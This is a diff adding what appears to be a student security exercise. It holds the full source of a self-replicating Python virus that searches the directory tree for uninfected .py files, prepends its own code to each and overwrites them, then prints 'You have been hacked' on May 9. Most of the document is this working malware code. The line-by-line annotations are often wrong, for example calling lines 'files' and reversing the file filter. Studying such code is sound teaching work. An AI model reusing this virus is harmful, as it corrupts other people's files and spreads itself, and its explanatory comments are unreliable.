@@ -1,0 +1,54 @@
+301Challenge14
+
+########################
+
+*****DO NOT EXECUTE*****
+
+########################
+
+
+#!/usr/bin/python3							-- the language is python
+import os								-- import OS library
+import datetime								-- import date library
+
+SIGNATURE = "VIRUS"							-- define the variable SIGNATURE as text "virus"
+
+def locate(path):							-- define the function "locate" when executed against a specific path
+    files_targeted = []							-- create a blank list of files targeted
+    filelist = os.listdir(path)						-- define a list of files using the os function for the specific path
+    for fname in filelist:						-- loop through the files from the os function in the path
+        if os.path.isdir(path+"/"+fname):				-- read the name of the files
+            files_targeted.extend(locate(path+"/"+fname))		-- add the files to the files_targeted list
+        elif fname[-3:] == ".py":					-- unless they're python scripts
+            infected = False						-- set the variable "infected" to false
+            for line in open(path+"/"+fname):				-- for each line (file),
+                if SIGNATURE in line:					-- if the word "virus" is in the line
+                    infected = True					-- then set the variable "infected" to true
+                    break						-- and break the function; return to script
+            if infected == False:					-- but if not, then
+                files_targeted.append(path+"/"+fname)			-- add the filename to the files_targeted list
+    return files_targeted						-- export the list to a global variable
+
+def infect(files_targeted):						-- define the function infect against the variable file list from locate function
+    virus = open(os.path.abspath(__file__))				-- 'virus' = open the absolute path of each file using the os library
+    virusstring = ""							-- virus string variable is blank
+    for i,line in enumerate(virus):					-- next three lines, enumerate the first 39 files using their absolute path
+        if 0 <= i < 39:
+            virusstring += line
+    virus.close								-- close the enumeration
+    for fname in files_targeted:					-- then, for each file:
+        f = open(fname)							-- open the files using the list (default 'r')
+        temp = f.read()							-- define the variable 'temp' as the command to read the files
+        f.close()							-- close the files
+        f = open(fname,"w")						-- then open the files with 'w'
+        f.write(virusstring + temp)					-- overwrite the file contents with the variable 'virusstring' and the file name
+        f.close()							-- close the files
+
+def detonate():								-- define the detonate function - on May 9th, print the message
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+
+files_targeted = locate(os.path.abspath(""))				-- files_targeted list = the whole directory
+infect(files_targeted)							-- execute the infect function against the whole directory
+detonate()								-- execute the detonate function
+
